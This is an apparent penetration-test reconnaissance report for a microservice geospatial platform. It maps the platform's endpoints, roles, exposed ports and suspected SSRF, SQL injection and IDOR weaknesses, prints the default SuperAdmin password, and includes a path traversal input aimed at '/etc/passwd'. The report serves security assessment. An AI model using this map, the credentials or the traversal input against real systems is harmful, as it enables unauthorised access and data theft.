# Reconnaissance Deliverable: ADDP (All Domain Data Platform)

## 0) HOW TO READ THIS
This reconnaissance report provides a comprehensive map of the application's attack surface, with special emphasis on authorization and privilege escalation opportunities for the Authorization Analysis Specialist.

**Key Sections for Authorization Analysis:**
- **Section 4 (API Endpoint Inventory):** Contains authorization details for each endpoint - focus on "Required Role" and "Object ID Parameters" columns to identify IDOR candidates.
- **Section 6.4 (Guards Directory):** Catalog of authorization controls - understand what each guard means before analyzing vulnerabilities.
- **Section 7 (Role & Privilege Architecture):** Complete role hierarchy and privilege mapping - use this to understand the privilege lattice and identify escalation targets.
- **Section 8 (Authorization Vulnerability Candidates):** Pre-prioritized lists of endpoints for horizontal, vertical, and context-based authorization testing.

**How to Use the Network Mapping (Section 6):** The entity/flow mapping shows system boundaries and data sensitivity levels. Pay special attention to flows marked with authorization guards and entities handling PII/sensitive data.

**Priority Order for Testing:** Start with Section 8's High-priority horizontal candidates, then vertical escalation endpoints for each role level, finally context-based workflow bypasses.

## 1. Executive Summary

The All Domain Data Platform (ADDP) is a sophisticated enterprise-level microservices-based geospatial data management system accessible at **http://localhost:5170**. The platform consists of 9 core backend services (System, Manager, Meta, Transfer, Orchestrator, Develop, Service, Copilot, Gateway), 4 Python workflow engines, and a unified Vue.js frontend portal.

**Core Technology Stack:**
- **Frontend:** Vue 3.4+ with TypeScript, Vite 5.0, Element Plus UI, Pinia state management
- **Backend:** Go 1.24+ with Gin framework, GORM for database access
- **Workflow Engines:** Python 3.11+ with Flask, GeoPandas for spatial processing
- **Infrastructure:** PostgreSQL 15+ with PostGIS/pgvector extensions, Redis caching, MinIO object storage, Meilisearch full-text search

**Primary User-Facing Components:**
- Unified portal dashboard at `/` with iframe-based module integration
- Authentication system with JWT-based stateless tokens
- Multi-tenant data isolation with schema-based separation
- Role-based access control (SuperAdmin, TenantAdmin, User)
- Comprehensive API surface with 300+ endpoints across 9 modules

**Attack Surface Overview:**
- **Authentication:** 3 public endpoints (login, register, refresh)
- **Protected Endpoints:** 300+ endpoints requiring JWT authentication
- **Internal APIs:** 20+ internal service-to-service endpoints
- **Public Data Services:** OGC-compliant geospatial tile/feature services
- **Default Credentials:** SuperAdmin account with password "20251001#SuperAdmin"

**Security Posture:**
- ✅ Strong JWT implementation with algorithm confusion attack prevention
- ✅ Multi-tenant data isolation with row-level tenant_id filtering
- ✅ Redis-cached authentication (90% reduction in validation calls)
- ✅ API key authentication with SHA-256 hashing
- ⚠️ JWT tokens stored in localStorage (XSS vulnerable)
- ⚠️ Internal API key validation not fully implemented
- ⚠️ Several authorization bypass opportunities identified

## 2. Technology & Service Map

### Frontend
- **Framework:** Vue 3.4+ with Composition API
- **Build Tool:** Vite 5.0 with fast HMR and TypeScript 5.3
- **UI Library:** Element Plus v2.11.4 (enterprise component library)
- **State Management:** Pinia 2.1.7 (official Vue state management)
- **HTTP Client:** Axios with interceptors for authentication and token refresh
- **Map Libraries:** OpenLayers for geospatial visualization
- **Authentication:** JWT tokens stored in localStorage (XSS vulnerable)

### Backend
- **Language:** Go 1.24+
- **Framework:** Gin v1.11.0 (high-performance HTTP framework)
- **ORM:** GORM v1.30.0 with support for PostgreSQL, MySQL, ClickHouse, MongoDB
- **Task Queue:** Asynq v0.24.1 (Redis-backed distributed task queue)
- **JWT Library:** golang-jwt/jwt/v5 with strict algorithm verification
- **Microservices:**
  1. **Gateway Service** (Port 8000) - API gateway and reverse proxy
  2. **System Service** (Port 8180) - User management, authentication, engines, tenants
  3. **Manager Service** (Port 8280) - File management, embeddings, search
  4. **Service Module** (Port 8480) - Data publishing, OGC services, external service proxy
  5. **Transfer Service** (Port 8580) - Data import/export, task scheduling
  6. **Meta Service** (Port 8380) - Metadata catalog, lineage, scanning
  7. **Develop Service** (Port 8680) - SQL workbench, notebooks, workflow execution
  8. **Orchestrator Service** (Port 8780) - Workflow orchestration and scheduling
  9. **Copilot Service** (Port 8880) - AI assistant with LLM integration

### Workflow Engines (Python 3.11+)
- **Python Workflow Engine** (Port 8099) - General-purpose workflow execution
- **Spark Workflow Engine** (Port 8199) - Distributed data processing
- **Math Workflow Engine** (Port 8299) - Mathematical computations
- **Jupyter Engine** (Port 8097) - Notebook execution environment
- **Libraries:** Flask 3.0.0, GeoPandas 0.15.0+, NumPy 2.0+, Pandas 2.0+

### Infrastructure
- **Database:** PostgreSQL 15+ with PostGIS (spatial), pgvector (embeddings), schema-based multi-tenancy
- **Cache:** Redis 6+ for session caching, rate limiting, task queuing
- **Object Storage:** MinIO (S3-compatible) for file storage with presigned URLs
- **Search:** Meilisearch v1.7 for full-text search with vector similarity
- **Reverse Proxy:** Nginx for SSL termination and routing
- **Container Orchestration:** Docker Compose with 20+ containers

### Identified Subdomains
Based on code analysis and live testing:
- **Primary:** localhost:5170 (Portal frontend - unified entry point)
- **Gateway:** localhost:8000 (API gateway)
- **System:** localhost:8180 (System service backend)
- **Manager:** localhost:8280 (Manager service backend)
- **Service:** localhost:8480 (Service module backend)
- **Transfer:** localhost:8580 (Transfer service backend)
- **Meta:** localhost:8380 (Meta service backend)
- **Develop:** localhost:8680 (Develop service backend)
- **Orchestrator:** localhost:8780 (Orchestrator backend)
- **Copilot:** localhost:8880 (Copilot backend)
- **Python Workflow:** localhost:8099 (Workflow engine)
- **Jupyter:** localhost:8097 (Notebook engine)

**Note:** All backend services are accessible internally via Docker network. External access routes through Nginx reverse proxy on port 80/443 (production) or port 5170 (development).

### Open Ports & Services
Based on live reconnaissance and docker-compose configuration:
- **5170/TCP:** Portal frontend (development server with Vite)
- **8000/TCP:** Gateway service (API gateway and routing)
- **8180/TCP:** System service (user/auth/engine management)
- **8280/TCP:** Manager service (file/data management)
- **8380/TCP:** Meta service (metadata catalog)
- **8480/TCP:** Service module (data publishing)
- **8580/TCP:** Transfer service (data transfer)
- **8680/TCP:** Develop service (SQL/notebook development)
- **8780/TCP:** Orchestrator service (workflow orchestration)
- **8880/TCP:** Copilot service (AI assistant)
- **8099/TCP:** Python workflow engine
- **8199/TCP:** Spark workflow engine
- **8299/TCP:** Math workflow engine
- **8097/TCP:** Jupyter notebook engine
- **15432/TCP:** PostgreSQL database (exposed for development)
- **16379/TCP:** Redis cache (exposed for development)
- **19000-19001/TCP:** MinIO object storage (API and console)
- **17700/TCP:** Meilisearch (full-text search engine)

**Security Concern:** Database (PostgreSQL) and cache (Redis) ports are exposed on the host for development, which should be restricted in production deployments.


## 3. Authentication & Session Management Flow

### Entry Points
- **POST /api/system/login** - Primary authentication endpoint with rate limiting (5 attempts per 15 minutes)
- **POST /api/system/register** - User registration (can be disabled via ALLOW_PUBLIC_REGISTRATION=false)
- **POST /api/system/refresh** - JWT token refresh endpoint

### Mechanism
**Step-by-step authentication flow:**

1. **Credential Submission:**
   - Client sends POST request to `/api/system/login` with `{username, password}`
   - Rate limiter checks IP address (max 5 attempts per 15 minutes)
   - Handler: `/Users/pampa/code/addp/system/backend/internal/api/auth_handler.go:25-52`

2. **User Validation:**
   - System service queries PostgreSQL for user by username
   - Verifies bcrypt password hash (cost factor 10)
   - Password hashing: `/Users/pampa/code/addp/system/backend/pkg/utils/password.go:5-13`

3. **Token Generation:**
   - JWT created with HS256 algorithm (HMAC-SHA256)
   - Claims include: `user_id`, `username`, `tenant_id`, `exp` (expiration), `iat` (issued at)
   - Default expiration: 180 minutes (3 hours)
   - Token generation: `/Users/pampa/code/addp/system/backend/pkg/utils/jwt.go:17-30`

4. **Cookie/Header Setting:**
   - Response returns `{access_token: "eyJhbGc...", token_type: "Bearer"}`
   - Frontend stores token in `localStorage.setItem('token', token)`
   - Subsequent requests include `Authorization: Bearer <token>` header

5. **Token Validation (on protected endpoints):**
   - **Option A - System Service (Direct):** Validates JWT signature and expiration locally
   - **Option B - Other Services (Delegated):** Calls System service `/api/system/users/me` to validate token
   - **Option C - Cached Middleware:** Checks Redis cache first (5-minute TTL), falls back to System service

### Code Pointers

**JWT Token Generation:**
- File: `/Users/pampa/code/addp/system/backend/pkg/utils/jwt.go`
- Function: `GenerateToken()` (Lines 17-30)
- Algorithm: HS256 with explicit validation to prevent "none" algorithm bypass (CVE-2015-9235)

**JWT Token Validation:**
- File: `/Users/pampa/code/addp/system/backend/pkg/utils/jwt.go`
- Function: `ParseToken()` (Lines 34-61)
- Security: Validates signing method is HMAC and algorithm is specifically HS256

**Authentication Middleware:**
- **System Service:** `/Users/pampa/code/addp/system/backend/internal/middleware/auth.go:13-42`
- **Cached Middleware:** `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go:39-180`
- **Standard Middleware:** `/Users/pampa/code/addp/common/middleware/auth/middleware.go:30-105`

**Frontend Token Storage:**
- File: `/Users/pampa/code/addp/common-frontend/basic/src/composables/useAuth.js`
- Storage: `localStorage.setItem('token', token)` (Lines 222-228)
- **Security Risk:** Tokens stored in localStorage are accessible to XSS attacks

**Token Refresh Flow:**
- File: `/Users/pampa/code/addp/system/backend/internal/api/auth_handler.go`
- Function: `Refresh()` (Lines 75-112)
- Mechanism: Accepts expired tokens (signature still validated), issues new token with same claims
- Frontend auto-refresh: `/Users/pampa/code/addp/common-frontend/basic/src/composables/useAuth.js:329-456`

### 3.1 Role Assignment Process

**Role Determination:**
- Roles assigned during user creation in `system.users` table
- Three role types: `super_admin`, `tenant_admin`, `user`
- SuperAdmin has `tenant_id = NULL` for platform-wide access
- TenantAdmin and User have `tenant_id` referencing their tenant

**Default Role:**
- New users created via registration: `user` role
- New users created by TenantAdmin: `user` role within same tenant
- First user in new tenant: `tenant_admin` role
- SuperAdmin can only be created manually in database or via seed data

**Role Upgrade Path:**
- Regular users cannot self-upgrade
- TenantAdmin can promote users within their tenant to `tenant_admin`
- SuperAdmin can change any user's role via `PUT /api/system/users/:id`
- **Code Implementation:** `/Users/pampa/code/addp/system/backend/internal/service/user_service.go:203-233`

**Default SuperAdmin Credentials:**
- Username: `SuperAdmin`
- Password: `20251001#SuperAdmin`
- **Security Risk:** Must be changed before production deployment

### 3.2 Privilege Storage & Validation

**Storage Location:**
- User role stored in `system.users.user_type` column (PostgreSQL)
- JWT claims include `tenant_id` but not `user_type` (must query database for role)
- Session cache in Redis stores full user info including role (5-minute TTL)

**Validation Points:**
- **Middleware Layer:** JWT signature and expiration validation
- **Service Layer:** Role-based access control via `AuthService`
  - `IsSuperAdmin()` - `/Users/pampa/code/addp/common/service/auth_service.go:25-27`
  - `IsTenantAdmin()` - `/Users/pampa/code/addp/common/service/auth_service.go:30-32`
  - `CheckTenantAccess()` - Lines 39-62 (tenant isolation enforcement)
  - `CheckResourceOwnership()` - Lines 64-82 (ownership validation)

**Cache/Session Persistence:**
- Redis cache key: `auth:token_cache:<SHA256(token)>` (prevents token leakage)
- Cache TTL: 5 minutes (configurable)
- Cache eviction: No explicit invalidation on logout (tokens valid until expiration)
- Performance: 90%+ cache hit rate, reducing System service load

**Code Pointers:**
- Role validation: `/Users/pampa/code/addp/common/service/auth_service.go`
- Cached middleware: `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go`

### 3.3 Role Switching & Impersonation

**Impersonation Features:**
- **Not implemented** in current version
- SuperAdmin can view/edit all tenant data but does not impersonate users
- No "sudo mode" or temporary privilege elevation

**Role Switching:**
- Users cannot switch between roles
- SuperAdmin access is permanent (no temporary escalation needed)
- TenantAdmin privileges are scoped to their tenant only

**Audit Trail:**
- All API requests logged with `user_id`, `tenant_id`, and `action`
- Audit logs stored in `system.audit_logs` table
- SuperAdmin cross-tenant access is logged
- Retention: 30 days (configurable via `LOG_RETENTION_DAYS`)
- **Code Implementation:** `/Users/pampa/code/addp/system/backend/internal/service/log_service.go`

## 4. API Endpoint Inventory

**Network Surface Focus:** Only includes API endpoints accessible through the target web application at http://localhost:5170. Excludes development/debug endpoints, local-only utilities, build tools, or endpoints that cannot be reached via network requests to the deployed application.

This table documents all discovered network-accessible API endpoints with authorization details for vulnerability analysis. For complete endpoint listing with handlers, see Task Agent output from route mapping analysis.

### 4.1 Public Endpoints (No Authentication Required)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/system/login | anon | None | None | User authentication with rate limiting (5/15min). `auth_handler.go:25` |
| POST | /api/system/register | anon | None | None | User registration (can be disabled). `auth_handler.go:63` |
| POST | /api/system/refresh | anon | None | None | JWT token refresh. `auth_handler.go:88` |
| GET | /health | anon | None | None | Health check (all services) |
| GET | / | anon | None | None | Gateway homepage with service list |

### 4.2 OGC/Geospatial Public Endpoints

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/query/:serviceName | anon/user | serviceName | PublicAccess flag check in handler | Query published data services. `query_handler.go:208` |
| GET | /ogc/features/:serviceName | anon/user | serviceName | PublicAccess flag check | OGC API Features landing page |
| GET | /ogc/features/:serviceName/collections | anon/user | serviceName | PublicAccess flag check | OGC collections list |
| GET | /ogc/features/:serviceName/collections/:collectionId/items | anon/user | serviceName, collectionId | PublicAccess flag check | OGC collection items |
| GET | /tiles/:serviceName/:layerName/:z/:x/*yformat | anon/user | serviceName, layerName | PublicAccess flag check | XYZ tile service |
| GET | /wmts/:serviceName | anon/user | serviceName | PublicAccess flag check | WMTS GetCapabilities |
| ANY | /api/service/registered/proxy/:id/*path | **PUBLIC** | id | **NONE (CRITICAL SSRF)** | Service proxy endpoint. `registered_service_service.go:854` |

**Security Note:** The service proxy endpoint at `/api/service/registered/proxy/:id/*path` has NO authentication and is vulnerable to SSRF attacks.


### 4.3 System Module - User Management (Authorization-Sensitive)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/system/users | tenant_admin | None | JWT + role check | Create user in tenant. `user_handler.go:18` |
| GET | /api/system/users | user | None | JWT + tenant-scoped | List users (scoped to tenant). `user_handler.go:30` |
| GET | /api/system/users/me | user | None | JWT | Get current user info. `user_handler.go:23` |
| GET | /api/system/users/:id | user | user_id | JWT + tenant access check | Get user by ID. `user_handler.go:41` |
| PUT | /api/system/users/:id | user | user_id | JWT + ownership/admin check | Update user. `user_handler.go:53` |
| DELETE | /api/system/users/:id | tenant_admin | user_id | JWT + admin check | Delete user. `user_handler.go:76` |
| PUT | /api/system/users/:id/change-password | user | user_id | JWT + ownership check | Change password. `user_handler.go:91` |

**Authorization Details:**
- `GET /api/system/users` - SuperAdmin gets empty list (must use tenant endpoints), TenantAdmin gets same-tenant users, User gets only self
- `GET /api/system/users/:id` - Validates `user_id` belongs to same tenant
- `PUT /api/system/users/:id` - Users can only update self, TenantAdmin can update same-tenant users
- `DELETE /api/system/users/:id` - Only TenantAdmin or SuperAdmin can delete

### 4.4 System Module - Engine Management (High-Value Targets)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/system/engines | tenant_admin | None | JWT + admin check | Register database engine. `engine_handler.go:29` |
| GET | /api/system/engines | user | None | JWT + tenant-scoped | List engines (includes built-ins). `engine_handler.go:46` |
| GET | /api/system/engines/:id | user | engine_id | JWT + tenant access check | Get engine details. `engine_handler.go:107` |
| PUT | /api/system/engines/:id | tenant_admin | engine_id | JWT + admin + ownership | Update engine config. `engine_handler.go:126` |
| DELETE | /api/system/engines/:id | tenant_admin | engine_id | JWT + admin + not builtin | Delete engine. `engine_handler.go:147` |
| POST | /api/system/engines/:id/test | user | engine_id | JWT + tenant access | Test connection. `engine_handler.go:264` |
| GET | /api/system/engines/:id/schemas | user | engine_id, schema (query) | JWT + tenant access | **SQL Injection Risk in schema param** |
| GET | /api/system/engines/:id/tables | user | engine_id, schema (query) | JWT + tenant access | List tables. `engine_handler.go:350` |

**Security Notes:**
- Engine `connection_info` contains database credentials (encrypted at rest)
- Built-in engines (is_builtin=true) are visible to all tenants but cannot be modified/deleted
- Schema name from query parameter not validated (potential SQL injection)

### 4.5 System Module - Tenant Management (SuperAdmin Only)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/system/tenants | super_admin | None | JWT + SuperAdmin check | Create new tenant. `tenant_handler.go:20` |
| GET | /api/system/tenants | super_admin | None | JWT + SuperAdmin check | List all tenants. `tenant_handler.go:32` |
| GET | /api/system/tenants/:id | super_admin | tenant_id | JWT + SuperAdmin check | Get tenant details. `tenant_handler.go:47` |
| PUT | /api/system/tenants/:id | super_admin | tenant_id | JWT + SuperAdmin check | Update tenant. `tenant_handler.go:58` |
| DELETE | /api/system/tenants/:id | super_admin | tenant_id | JWT + SuperAdmin check | Delete tenant. `tenant_handler.go:70` |

### 4.6 System Module - API Key Management

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/system/applications | user | None | JWT + tenant isolation | Create application. `application_handler.go` |
| GET | /api/system/applications | user | None | JWT + tenant-scoped | List applications |
| GET | /api/system/applications/:id | user | app_id | JWT + tenant access | Get application details |
| POST | /api/system/applications/:id/keys | user | app_id | JWT + ownership check | Generate API key |
| GET | /api/system/applications/:id/keys | user | app_id | JWT + ownership check | List API keys (hashed) |
| DELETE | /api/system/applications/:id/keys/:key_id | user | app_id, key_id | JWT + ownership check | Revoke API key |

### 4.7 Manager Module - File & Data Management

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/manager/embedding | user | None | JWT + tenant isolation | Create embedding task |
| GET | /api/manager/embedding/tasks/:task_id | user | task_id | JWT + tenant check | Get embedding task status |
| GET | /api/manager/engines/:id/spatial/tiles/:schema/:table/:z/:x/:y | user | engine_id, schema, table | JWT + tenant access | MVT tile generation (potential IDOR) |
| GET | /api/manager/search | user | None (q query param) | JWT | Hybrid search with Meilisearch |
| GET | /api/manager/video-stream | user | None (path query param) | JWT | Video streaming endpoint |

**Security Note:** MVT tile endpoint uses engine_id, schema, and table parameters. Potential for accessing other tenants' data if authorization not properly enforced.

### 4.8 Service Module - Data Publishing

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/service/query | user | None | JWT + tenant isolation | Create query service |
| GET | /api/service/query | user | None | JWT + tenant-scoped | List query services |
| GET | /api/service/query/:id | user | service_id | JWT + tenant access | Get query service |
| PUT | /api/service/query/:id | user | service_id | JWT + tenant + ownership | Update query service |
| DELETE | /api/service/query/:id | user | service_id | JWT + tenant + ownership | Delete query service |
| POST | /api/service/registered | user | None | JWT + tenant isolation | **Register external service (SSRF risk)** |
| GET | /api/service/registered/:id | user | service_id | JWT + tenant access | Get registered service |
| POST | /api/service/registered/:id/refresh | user | service_id | JWT + tenant access | **Refresh metadata (SSRF risk)** |
| POST | /api/service/registered/:id/health | user | service_id | JWT + tenant access | **Health check (SSRF risk)** |

**Security Note:** Registered service endpoints accept user-controlled URLs without validation, enabling SSRF attacks against internal infrastructure.

### 4.9 Transfer Module - Data Transfer Tasks

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/transfer/tasks | user | None | JWT + tenant isolation | Create transfer task |
| GET | /api/transfer/tasks | user | None | JWT + tenant-scoped | List transfer tasks |
| GET | /api/transfer/tasks/:id | user | task_id | JWT + tenant access | Get task details |
| PUT | /api/transfer/tasks/:id | user | task_id | JWT + tenant + ownership | Update task |
| DELETE | /api/transfer/tasks/:id | user | task_id | JWT + tenant + ownership | Delete task |
| POST | /api/transfer/tasks/:id/start | user | task_id | JWT + tenant + ownership | Start transfer |
| POST | /api/transfer/tasks/:id/stop | user | task_id | JWT + tenant + ownership | Stop transfer |
| GET | /api/transfer/executions/:id | user | execution_id | JWT + tenant access | Get execution details |

### 4.10 Develop Module - SQL & Notebooks

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/develop/items | user | None | JWT + tenant isolation | Create dev item (query/workflow/notebook) |
| GET | /api/develop/items | user | None | JWT + tenant-scoped | List dev items |
| GET | /api/develop/items/:id | user | item_id | JWT + tenant access | Get dev item |
| PUT | /api/develop/items/:id | user | item_id | JWT + tenant + ownership | Update dev item |
| DELETE | /api/develop/items/:id | user | item_id | JWT + tenant + ownership | Delete dev item |
| POST | /api/develop/items/:id/execute | user | item_id | JWT + tenant + ownership | Execute dev item |
| POST | /api/develop/execute | user | None (engine_id in body) | JWT | **Direct SQL execution (injection risk)** |
| POST | /api/develop/notebooks/upload | user | None | JWT | **File upload (path traversal risk)** |
| POST | /api/develop/notebooks/execute | user | None | JWT | Execute Jupyter notebook |

**Security Notes:**
- Direct SQL execution endpoint accepts raw SQL queries without sanitization
- Notebook upload endpoint lacks file extension validation and path sanitization

### 4.11 Orchestrator Module - Workflow Management

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| POST | /api/orchestrator/orchestrations | user | None | JWT + tenant isolation | Create orchestration |
| GET | /api/orchestrator/orchestrations | user | None | JWT + tenant-scoped | List orchestrations |
| GET | /api/orchestrator/orchestrations/:id | user | orch_id | JWT + tenant access | Get orchestration |
| PUT | /api/orchestrator/orchestrations/:id | user | orch_id | JWT + tenant + ownership | Update orchestration |
| DELETE | /api/orchestrator/orchestrations/:id | user | orch_id | JWT + tenant + ownership | Delete orchestration |
| POST | /api/orchestrator/orchestrations/:id/execute | user | orch_id, engine_id (body) | JWT + tenant + ownership | **Execute workflow (SSRF to engine)** |
| GET | /api/orchestrator/executions/:id | user | execution_id | JWT + tenant access | Get execution details |

**Security Note:** Workflow execution connects to user-configurable workflow engines, potential SSRF if engine URL is attacker-controlled.

### 4.12 Internal Service-to-Service API (X-Internal-API-Key Required)

| Method | Endpoint Path | Required Role | Object ID Parameters | Authorization Mechanism | Description & Code Pointer |
|---|---|---|---|---|---|
| GET | /api/internal/engines | internal | None | X-Internal-API-Key | List all engines (bypasses tenant isolation) |
| GET | /api/internal/engines/:id | internal | engine_id | X-Internal-API-Key | Get engine (bypasses tenant isolation) |
| POST | /api/internal/engines/register | internal | None | X-Internal-API-Key | Register engine internally |
| GET | /api/internal/api-keys/validate | internal | None (key hash in query) | X-Internal-API-Key | Validate API key hash |
| POST | /api/internal/audit-logs | internal | None | X-Internal-API-Key | Create audit log entry |

**Security Note:** Internal API key validation is weak (TODO comment in code). Any service with knowledge of the key can impersonate other services and inject arbitrary tenant IDs via `X-Tenant-ID` header.


## 5. Potential Input Vectors for Vulnerability Analysis

**Network Surface Focus:** Only includes input vectors accessible through the target web application's network interface at http://localhost:5170. Excludes inputs from local-only scripts, build tools, development utilities, or components that cannot be reached via network requests to the deployed application.

This section lists every location where the network-accessible application accepts user-controlled input, with exact file paths and line numbers for downstream vulnerability analysis.

### 5.1 URL Parameters (Path & Query)

**User/Engine/Tenant IDs:**
- `:id` - All `:id` URL parameters across all modules (parsed as uint via `BindIDParam`)
- `:user_id` - User management endpoints (`/api/system/users/:id`)
- `:engine_id` - Engine management endpoints (`/api/system/engines/:id`)
- `:tenant_id` - Tenant management endpoints (`/api/system/tenants/:id`)
- `:task_id` - Transfer and embedding task endpoints
- `:execution_id` - Workflow/transfer execution endpoints
- `:service_id` - Query/tile service endpoints (`/api/service/query/:id`)

**Resource Identifiers:**
- `:serviceName` - OGC service name parameter (used in tile/feature endpoints)
- `:collectionId` - OGC collection identifier
- `:layerName` - Tile layer name
- `:schema` - Database schema name (`/api/system/engines/:id/tables?schema=...`) **INJECTION RISK**
- `:table` - Database table name
- `*filepath` - Workspace file path (`/api/workspace/*filepath`) **PATH TRAVERSAL RISK**
- `*path` - Proxy path parameter (`/api/service/registered/proxy/:id/*path`) **SSRF RISK**

**Query String Parameters:**
- `page` - Pagination (parsed as int, default: 1)
- `page_size` - Page size (parsed as int, default: 10/50, no max limit)
- `filter` - SQL filter clause **INJECTION RISK** (`/api/service/query/:id?filter=...`)
- `orderBy` - SQL ORDER BY clause **INJECTION RISK** (`/api/service/query/:id?orderBy=...`)
- `q` - Search query parameter (trimmed but not sanitized)
- `token` - JWT token fallback for iframe scenarios
- `schema` - Schema name filter **INJECTION RISK**

**Code Locations:**
- Common ID binding: `/Users/pampa/code/addp/common/api/common.go` (BindIDParam helper)
- Schema parameter: `/Users/pampa/code/addp/system/backend/internal/api/engine_handler.go:356`
- Filter/orderBy: `/Users/pampa/code/addp/service/backend/internal/service/query_executor_service.go:186-214`
- Workspace filepath: `/Users/pampa/code/addp/labs/abs/backend/internal/api/handler.go:194`

### 5.2 POST/PUT Body Fields (JSON)

**Authentication:**
- `username` (string, required) - Login/registration
- `password` (string, required, min=6) - Login/registration/password change
- `email` (string) - User creation/update (no email format validation)

**User Management:**
- `full_name` (string) - User display name
- `user_type` (enum: super_admin, tenant_admin, user) - Role assignment
- `is_active` (boolean) - User activation status
- `old_password` (string, required) - Password change
- `new_password` (string, required, min=6) - Password change

**Engine Configuration:**
- `name` (string, required) - Engine name
- `engine_type` (string, required) - Engine type identifier
- `connection_info` (map[string]interface{}, required) - **Database credentials (no nested validation)** **CREDENTIAL EXPOSURE**
  - Subfields: `host`, `port`, `user`, `password`, `database`, `protocol`
- `description` (string) - Engine description
- `capabilities` (JSON string) - Engine capabilities

**Query/Workflow Execution:**
- `query` (string, required) - Raw SQL query **SQL INJECTION RISK**
- `expression` (string) - Python expression for calculate_field operator **EXPRESSION INJECTION**
- `start_command` (array of strings) - Application launch command **COMMAND INJECTION RISK**
- `workspace_path` (string) - Working directory path **PATH TRAVERSAL RISK**

**Data Services:**
- `endpoint_url` (string, required) - External service URL **SSRF RISK** (no validation)
- `health_check_url` (string) - Health check URL **SSRF RISK**
- `service_name` (string, required) - Service identifier
- `public_access` (boolean) - Whether service is publicly accessible

**Transfer Tasks:**
- `config` (map[string]interface{}, required) - Transfer configuration (contains credentials)
- `source_field` (string, required) - Field mapping source **SQL INJECTION RISK**
- `target_field` (string, required) - Field mapping target **SQL INJECTION RISK**
- `filter` (string) - Data filter expression **SQL INJECTION RISK**

**File Uploads:**
- `file` (multipart file) - Notebook file upload **NO EXTENSION VALIDATION** **PATH TRAVERSAL**
- `filename` (from file upload) - Used directly without sanitization

**Code Locations:**
- Login request: `/Users/pampa/code/addp/system/backend/internal/models/user.go:38-42`
- Engine creation: `/Users/pampa/code/addp/system/backend/internal/models/engine.go:12-20`
- SQL execution: `/Users/pampa/code/addp/develop/backend/internal/api/query_handler.go:101-105`
- Service registration: `/Users/pampa/code/addp/service/backend/internal/service/registered_service_service.go:34-99`
- App launch: `/Users/pampa/code/addp/labs/abs/backend/internal/service/app_service.go:85-148`
- Notebook upload: `/Users/pampa/code/addp/develop/backend/internal/api/notebook_handler.go:212-316`

### 5.3 HTTP Headers

**Authentication:**
- `Authorization` (format: "Bearer <token>") - JWT authentication (manual parsing, Lines 38-56 in auth middleware)
- `X-API-Key` - Application API key (SHA-256 hash validation)
- `X-Internal-API-Key` - Internal service authentication **WEAK VALIDATION** (TODO comment in code)

**Tenant Isolation:**
- `X-Tenant-ID` - Tenant identifier for internal API calls (only validated when X-Internal-API-Key present)

**Other Headers:**
- `X-Forwarded-For` - Client IP address (used for rate limiting)
- `Content-Type` - Request content type
- `User-Agent` - Client user agent

**Code Locations:**
- Authorization header: `/Users/pampa/code/addp/common/middleware/auth/middleware.go:38-56`
- API key header: `/Users/pampa/code/addp/gateway/internal/middleware/api_key_auth.go:44-50`
- Internal key header: `/Users/pampa/code/addp/common/middleware/auth/cached_middleware.go:47-73`

### 5.4 Cookie Values

**No Cookies Used:** The application stores JWT tokens in localStorage instead of cookies. This means traditional cookie security flags (HttpOnly, Secure, SameSite) are not applicable, and the system is vulnerable to XSS-based token theft.

**Security Impact:**
- Any XSS vulnerability can steal authentication tokens
- No protection against token theft via malicious JavaScript
- CSRF protection relies on custom headers only

### 5.5 File Uploads

**Notebook Upload:**
- Endpoint: `POST /api/develop/notebooks/upload`
- File parameter: `file` (multipart/form-data)
- Accepted types: **NO VALIDATION** (should be .ipynb only)
- Size limit: **NONE**
- Filename sanitization: **NONE** (path traversal vulnerability)
- Location: `/Users/pampa/code/addp/develop/backend/internal/api/notebook_handler.go:249-272`

**Security Risks:**
- No file extension validation (accepts any file type)
- No file size limit (DoS via large files)
- Filename used directly: `notebookPath := file.Filename` (path traversal: `../../etc/passwd`)
- No content scanning for malicious code

## 6. Network & Interaction Map

**Network Surface Focus:** Only maps components of the deployed, network-accessible infrastructure at http://localhost:5170. Excludes local development environments, build CI systems, local-only tools, or components that cannot be reached through the target application's network interface.

### 6.1 Entities

| Title | Type | Zone | Tech | Data | Notes |
|---|---|---|---|---|---|
| Public Internet | ExternAsset | Internet | N/A | Public | External users and attackers |
| Nginx Reverse Proxy | Service | Edge | Nginx | Public | SSL termination, routing to Gateway |
| Gateway Service | Service | Edge | Go/Gin | Public | API gateway, rate limiting, API key validation |
| System Service | Service | App | Go/Gin | PII, Tokens | User/auth/engine/tenant management |
| Manager Service | Service | App | Go/Gin | PII, Files | File management, embeddings, search |
| Service Module | Service | App | Go/Gin | Public | Data publishing, OGC services, **SSRF proxy** |
| Transfer Service | Service | App | Go/Gin | PII | Data import/export tasks |
| Meta Service | Service | App | Go/Gin | Public | Metadata catalog, lineage |
| Develop Service | Service | App | Go/Gin | PII, Secrets | SQL workbench, notebooks, **SQL injection** |
| Orchestrator | Service | App | Go/Gin | Public | Workflow orchestration |
| Copilot | Service | App | Python/Flask | PII | AI assistant |
| Python Workflow | Service | App | Python/Flask | Public | Workflow engine, **expression injection** |
